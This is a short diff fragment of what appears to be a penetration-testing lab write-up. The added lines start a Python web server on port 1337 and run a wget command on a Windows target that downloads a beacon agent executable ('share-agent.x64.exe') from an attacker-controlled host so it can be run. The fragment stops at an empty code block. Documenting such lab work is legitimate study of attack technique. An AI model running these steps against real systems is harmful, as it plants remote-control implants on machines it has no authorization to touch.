@@ -166,5 +166,18 @@ Now i have this i can set a beacon up again on this since i am now an administra
 Ive generated the agent now i can transfer it to the target ill do this with a python webserver
 
 ```python
+python3 -m http.server 1337  
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+```
+
+```python
+PS C:\Users\svc_netops\Documents> wget http://192.168.211.2:1337/share-agent.x64.exe -o share-agent.x64.exe
+```
+This downloaded the file
+
+Now i can execute it!
+
+```python
 
 ```
+
